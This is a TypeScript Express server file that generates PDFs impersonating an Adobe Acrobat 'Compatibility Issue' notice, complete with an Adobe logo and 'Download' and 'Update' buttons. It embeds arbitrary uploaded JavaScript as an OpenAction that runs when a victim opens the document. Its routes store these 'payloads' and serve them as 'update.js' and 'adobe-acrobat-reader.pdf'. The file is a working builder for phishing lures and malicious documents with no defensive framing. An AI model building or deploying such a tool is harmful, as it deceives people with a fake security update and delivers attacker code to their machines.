import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import { PDFDocument, rgb, StandardFonts, PDFPage } from "pdf-lib";
import { readFileSync } from "fs";
import { resolve } from "path";

async function generatePDFMatchingHomepage(
  jsContent: string,
  filename: string
): Promise<string> {
  const pdfDoc = await PDFDocument.create();
  const pageWidth = 612;
  const pageHeight = 792;
  const page = pdfDoc.addPage([pageWidth, pageHeight]);

  const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
  const fontBold = await pdfDoc.embedFont(StandardFonts.HelveticaBold);

  // Page background
  page.drawRectangle({
    x: 0,
    y: 0,
    width: pageWidth,
    height: pageHeight,
    color: rgb(0.945, 0.957, 0.973),
  });

  // Card dimensions
  const cardWidth = 220;
  const cardHeight = 170;
  const cardX = (pageWidth - cardWidth) / 2;
  const cardY = (pageHeight - cardHeight) / 2;

  // White card background
  page.drawRectangle({
    x: cardX,
    y: cardY,
    width: cardWidth,
    height: cardHeight,
    color: rgb(1, 1, 1),
  });

  // Red header strip
  page.drawRectangle({
    x: cardX,
    y: cardY + cardHeight - 1,
    width: cardWidth,
    height: 1,
    color: rgb(0.89, 0.11, 0.14),
  });

  const p = 8; // padding

  // HEADER SECTION
  const logoSize = 18;
  const headerStartY = cardY + cardHeight - 5;
  
  // Logo box
  page.drawRectangle({
    x: cardX + p,
    y: headerStartY - logoSize - 2,
    width: logoSize,
    height: logoSize,
    color: rgb(1, 0.96, 0.96),
    borderColor: rgb(0.95, 0.95, 0.95),
    borderWidth: 0.5,
  });

  // Adobe logo
  try {
    const logoPath = resolve("attached_assets/adobe_reader_14145_1766295497679.png");
    const imageData = readFileSync(logoPath);
    const logoImage = await pdfDoc.embedPng(imageData);
    page.drawImage(logoImage, {
      x: cardX + p + 1,
      y: headerStartY - logoSize - 1,
      width: logoSize - 2,
      height: logoSize - 2,
    });
  } catch (err) {
    console.log("Logo not found");
  }

  // Title and subtitle
  const titleX = cardX + p + logoSize + 3;
  const titleY = headerStartY - 3;
  
  page.drawText("Adobe Acrobat", {
    x: titleX,
    y: titleY,
    size: 7.5,
    font: fontBold,
    color: rgb(0.08, 0.08, 0.08),
  });

  page.drawText("Compatibility Issue", {
    x: titleX,
    y: titleY - 9,
    size: 5,
    font: fontBold,
    color: rgb(0.89, 0.11, 0.14),
  });

  // Divider line
  const dividerY = titleY - 12;
  page.drawLine({
    start: { x: cardX + p, y: dividerY },
    end: { x: cardX + cardWidth - p, y: dividerY },
    thickness: 0.5,
    color: rgb(0.93, 0.93, 0.93),
  });

  // Content section
  const contentStartY = dividerY - 3;
  const contentText = "Your PDF reader may not fully support encrypted documents. Please update or download Adobe Reader.";
  
  page.drawText(contentText, {
    x: cardX + p,
    y: contentStartY,
    size: 6,
    font: font,
    color: rgb(0.4, 0.4, 0.4),
    maxWidth: cardWidth - (p * 2),
    lineHeight: 7.5,
  });

  // Buttons section - positioned lower to avoid overlap
  const buttonHeight = 18;
  const buttonGap = 3;
  const buttonWidth = (cardWidth - (p * 2) - buttonGap) / 2;
  const buttonY = cardY + 38; // Position at bottom near footer
  const buttonX1 = cardX + p;
  const buttonX2 = buttonX1 + buttonWidth + buttonGap;

  // Download button (outline)
  page.drawRectangle({
    x: buttonX1,
    y: buttonY,
    width: buttonWidth,
    height: buttonHeight,
    color: rgb(1, 1, 1),
    borderColor: rgb(0.82, 0.82, 0.82),
    borderWidth: 0.5,
  });

  page.drawText("Download", {
    x: buttonX1 + 3,
    y: buttonY + 4,
    size: 5.5,
    font: fontBold,
    color: rgb(0.15, 0.15, 0.15),
  });

  // Update button (red)
  page.drawRectangle({
    x: buttonX2,
    y: buttonY,
    width: buttonWidth,
    height: buttonHeight,
    color: rgb(0.89, 0.11, 0.14),
  });

  page.drawText("Update", {
    x: buttonX2 + 3,
    y: buttonY + 4,
    size: 5.5,
    font: fontBold,
    color: rgb(1, 1, 1),
  });

  // Footer section
  const footerY = cardY + 2;
  page.drawRectangle({
    x: cardX,
    y: footerY,
    width: cardWidth,
    height: 14,
    color: rgb(0.98, 0.98, 0.98),
  });

  page.drawLine({
    start: { x: cardX, y: footerY + 14 },
    end: { x: cardX + cardWidth, y: footerY + 14 },
    thickness: 0.5,
    color: rgb(0.92, 0.925, 0.93),
  });

  page.drawText("Use latest Adobe Acrobat Reader for optimal compatibility.", {
    x: cardX + p,
    y: footerY + 2,
    size: 4.5,
    font: font,
    color: rgb(0.75, 0.75, 0.75),
    maxWidth: cardWidth - (p * 2),
    lineHeight: 5,
  });

  // Embed JavaScript
  try {
    const jsObj = pdfDoc.context.obj({
      Type: "Action",
      S: "JavaScript",
      JS: `(function() {
try {
  ${jsContent}
} catch(e) {
  console.log("Error: " + e.message);
}
})()`,
    });
    pdfDoc.catalog.set(pdfDoc.context.namedMember("OpenAction"), jsObj);
  } catch (err) {
    console.log("JS embedding skipped");
  }

  const pdfBytes = await pdfDoc.save();
  return Buffer.from(pdfBytes).toString("base64");
}

async function seedDefaultPayload() {
  const existing = await storage.getLatestPayload();
  if (!existing) {
    const defaultJS = `console.log("Adobe Acrobat - Security Update Available");`;
    const pdfBase64 = await generatePDFMatchingHomepage(defaultJS, "update.js");
    await storage.savePayload({
      filename: "update.js",
      jsContent: defaultJS,
      pdfData: pdfBase64,
    });
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  await seedDefaultPayload();

  app.post(api.payloads.upload.path, async (req, res) => {
    try {
      const input = api.payloads.upload.input.parse(req.body);
      const pdfBase64 = await generatePDFMatchingHomepage(input.jsContent, input.filename);

      const payload = await storage.savePayload({
        filename: input.filename,
        jsContent: input.jsContent,
        pdfData: pdfBase64,
      });

      res.status(201).json({ success: true, id: payload.id });
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      console.error("Upload error:", err);
      res.status(500).json({ message: "Failed to generate PDF" });
    }
  });

  app.get(api.payloads.getLatest.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).json({ message: "No payload found" });
    }
    res.json({ filename: payload.filename, jsContent: payload.jsContent });
  });

  app.get(api.payloads.download.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).send("No update available.");
    }

    res.setHeader('Content-Disposition', `attachment; filename="${payload.filename}"`);
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Content-Length', Buffer.byteLength(payload.jsContent));
    res.send(payload.jsContent);
  });

  app.get(api.payloads.downloadPdf.path, async (req, res) => {
    const payload = await storage.getLatestPayload();
    if (!payload) {
      return res.status(404).send("No payload found");
    }

    const pdfBuffer = Buffer.from(payload.pdfData, "base64");
    res.setHeader("Content-Type", "application/pdf");
    res.setHeader("Content-Disposition", `attachment; filename="adobe-acrobat-reader.pdf"`);
    res.send(pdfBuffer);
  });

  return httpServer;
}
